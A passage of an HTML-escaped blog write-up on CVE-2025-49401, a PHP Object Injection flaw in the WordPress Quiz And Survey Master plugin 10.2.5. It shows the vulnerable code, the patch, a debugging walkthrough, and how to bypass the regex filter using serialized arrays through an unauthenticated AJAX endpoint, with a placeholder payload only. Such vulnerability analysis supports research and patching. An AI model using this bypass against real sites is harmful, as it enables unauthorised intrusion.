1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; – &lt;strong&gt;Quiz And Survey Master&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;10.2.5&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;10.2.6&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability originates from the use of &lt;code&gt;maybe_unserialize()&lt;/code&gt;. Although some checks exist, this mechanism is still not fully secure.&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/^(O|C):\d+:/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$qmn_sanitize_random_ids&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_serialized&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$qmn_sanitize_random_ids&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$unserialized&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;maybe_unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$qmn_sanitize_random_ids&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_object&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$unserialized&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_resource&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$unserialized&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$unserialized&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch replaces &lt;code&gt;maybe_unserialize()&lt;/code&gt; with &lt;code&gt;unserialize()&lt;/code&gt; and blocks all object creation using &lt;code&gt;[&#39;allowed_classes&#39;&amp;ensp;=&amp;gt;&amp;ensp;false]&lt;/code&gt; → effectively preventing PHP Object Injection.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-17-cve-2025-49401/diff.png&#34; title=&#34;Patch changes&#34; data-thumbnail=&#34;/posts/2025-11-17-cve-2025-49401/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Patch changes&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-17-cve-2025-49401/diff.png&#39; alt=&#34;Diff&#34; height=&#34;772&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch changes&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;After reviewing the logic of &lt;code&gt;qsm_questions_answers_shortcode_to_text()&lt;/code&gt;, I noticed repeated appearances of keywords like &lt;code&gt;question&lt;/code&gt; and &lt;code&gt;answer&lt;/code&gt;, indicating this function is likely directly tied to question/answer processing.&lt;/p&gt;&#xA;&lt;p&gt;Instead of tracing step-by-step, I decided to search for related functions dealing with &lt;code&gt;question&lt;/code&gt; and &lt;code&gt;answer&lt;/code&gt;, while debugging inside &lt;code&gt;qsm_questions_answers_shortcode_to_text()&lt;/code&gt;. If this method didn’t work, I would perform a deeper trace.&lt;/p&gt;&#xA;&lt;p&gt;After some digging, I created a post with a custom question.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-17-cve-2025-49401/create_quiz.png&#34; title=&#34;Creating quiz with the plugin block&#34; data-thumbnail=&#34;/posts/2025-11-17-cve-2025-49401/create_quiz.png&#34; data-sub-html=&#34;&lt;h2&gt;Quiz Created&lt;/h2&gt;&lt;p&gt;Creating quiz with the plugin block&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-17-cve-2025-49401/create_quiz.png&#39; alt=&#34;Quiz Created&#34; height=&#34;625&#34; width=&#34;978&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Creating quiz with the plugin block&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Access the post and &lt;strong&gt;submit an answer&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-17-cve-2025-49401/debug1.png&#34; title=&#34;Debugger at qsm_questions_answers_shortcode_to_text&#34; data-thumbnail=&#34;/posts/2025-11-17-cve-2025-49401/debug1.png&#34; data-sub-html=&#34;&lt;h2&gt;Debug&lt;/h2&gt;&lt;p&gt;Debugger at qsm_questions_answers_shortcode_to_text&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-17-cve-2025-49401/debug1.png&#39; alt=&#34;Debug&#34; height=&#34;428&#34; width=&#34;1189&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Debugger at qsm_questions_answers_shortcode_to_text&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The debugger stopped at &lt;code&gt;qsm_questions_answers_shortcode_to_text()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Current request:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;POST&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nn&#34;&gt;/wp-admin/admin-ajax.php&lt;/span&gt;&amp;ensp;&lt;span class=&#34;kr&#34;&gt;HTTP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1.1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;...&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function &lt;code&gt;qmn_sanitize_random_ids_data()&lt;/code&gt; will call &lt;code&gt;maybe_unserialize()&lt;/code&gt;. But first, this condition must be met:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;quiz_answer_random_ids&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We can edit one of the fields in the request and replace it with &lt;code&gt;quiz_answer_random_ids&lt;/code&gt;.&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-diff&#34; data-lang=&#34;diff&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gd&#34;&gt;-&amp;ensp;Content-Disposition:&amp;ensp;form-data;&amp;ensp;name=&amp;#34;currentuserTimeZone&amp;#34;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gd&#34;&gt;-&amp;ensp;Asia/Bangkok&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gd&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gi&#34;&gt;+&amp;ensp;Content-Disposition:&amp;ensp;form-data;&amp;ensp;name=&amp;#34;quiz_answer_random_ids&amp;#34;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gi&#34;&gt;+&amp;ensp;payload&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The value of &lt;code&gt;qmn_sanitize_random_ids&lt;/code&gt; will be the input passed to &lt;code&gt;maybe_unserialize()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;![Debug](Value of qmn_sanitize_random_ids)&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;qmn_sanitize_random_ids_data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$qmn_sanitize_random_ids&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$qmn_sanitize_random_ids&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/^(O|C):\d+:/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$qmn_sanitize_random_ids&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_serialized&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$qmn_sanitize_random_ids&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&lt;span class=&#34;nv&#34;&gt;$unserialized&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;maybe_unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$qmn_sanitize_random_ids&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_object&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$unserialized&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_resource&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$unserialized&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&#x9;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$unserialized&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$qmn_sanitize_random_ids&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Before &lt;code&gt;maybe_unserialize&lt;/code&gt; is invoked, we need to bypass the only filter:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/^(O|C):\d+:/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$qmn_sanitize_random_ids&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The regex checks whether the string begins with &lt;code&gt;O:&lt;/code&gt; or &lt;code&gt;C:&lt;/code&gt;. For example: &lt;code&gt;O:8:&amp;quot;stdClass&amp;quot;:...&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Unfortunately, the defense is weak. Serialized payloads can begin with &lt;code&gt;a:&lt;/code&gt; (array), and arrays may contain &lt;code&gt;O:&lt;/code&gt; or &lt;code&gt;C:&lt;/code&gt; to trigger object deserialization.&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;The plugin registers an AJAX endpoint for &lt;strong&gt;unauthenticated users&lt;/strong&gt; (nopriv):&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;add_action&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wp_ajax_nopriv_qmn_process_quiz&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span 